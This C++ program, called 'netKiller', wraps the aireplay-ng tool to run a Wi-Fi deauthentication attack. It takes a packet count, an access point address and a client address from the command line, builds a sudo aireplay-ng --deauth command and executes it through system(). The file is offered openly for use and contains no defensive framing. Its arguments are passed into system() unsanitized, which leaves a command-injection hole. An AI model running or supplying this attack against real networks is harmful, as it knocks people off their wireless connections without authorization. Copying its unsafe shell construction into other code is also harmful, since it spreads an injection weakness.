#include<string>
#include<stdio.h>
#include<stdlib.h>
#include<iostream>
#include<unistd.h>
/*
	Proudly coded by Muhammad Aliff Muazzam (Tester2009).
	<3 Katze xD
	From German-Malaysian Institute (GMI). Training for Advanced Technology.
	Start dev: Feb 10, 2015. Tuesday

	https://www.facebook.com/Tester2009
	https://github.com/alepcat1710
	Feel free to use. Do not change copyright, mastah !
	
	Version: 0.1 netKiller
*/
/*
The MIT License (MIT)

Copyright (c) [2015] [Muhammad Aliff Muazzam]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
using namespace std;
int main(int argc, char *argv[])
{
	system("clear");
	usleep(3000000);
	std::string iD = "echo '\n	Hello. This tools was built by Tester2009\n\n';";
	std::string sR = "sudo"; // suROOT
	std::string deauth = "aireplay-ng"; // aircrack
	std::string deauth_2 = "--deauth";
	std::string pK = argv[1]; // paKET || etc: 300
	std::string A = "-a";
	std::string aP = argv[2]; // accessPOINT
	std::string C = "-c";
	std::string cL = argv[3]; // cLIENT
	std::string nI = "mon0"; // networkInterface
	std::string iN = "--ignore-negative-one"; // ignore negative one
	std::string cmd = iD+" "+sR+" "+deauth+" "+deauth_2+" "+pK+" "+A+" "+aP+" "+C+" "+cL+ " "+nI+" "+iN;
	//cout << cmd << "\n";

	system(cmd.c_str());

}
